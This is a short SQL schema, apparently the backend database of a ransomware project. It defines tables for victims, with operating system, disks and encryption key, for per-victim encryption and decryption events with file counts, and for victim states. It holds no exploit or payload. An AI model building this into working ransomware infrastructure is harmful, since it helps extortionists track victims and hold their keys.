CREATE TABLE victims
(
    id_victim INT PRIMARY KEY NOT NULL,
    os VARCHAR(255),
    hash VARCHAR(255),
    disks VARCHAR(255),
    key VARCHAR(255)
);

CREATE TABLE decrypted
(
    id_decrypted INT PRIMARY KEY NOT NULL,
    id_victim INT,
    date_time TIMESTAMP,
    nb_files INT,
    FOREIGN KEY (id_victim) REFERENCES victims(id_victim)
);

CREATE TABLE states
(
    id_state INT PRIMARY KEY NOT NULL,
    id_victim INT,
    date_time TIMESTAMP,
    state VARCHAR(255),
    FOREIGN KEY (id_victim) REFERENCES victims(id_victim)
);

CREATE TABLE encrypted
(
    id_encrypted INT PRIMARY KEY NOT NULL,
    id_victim INT,
    date_time TIMESTAMP,
    nb_files INT,
    FOREIGN KEY (id_victim) REFERENCES victims(id_victim)
);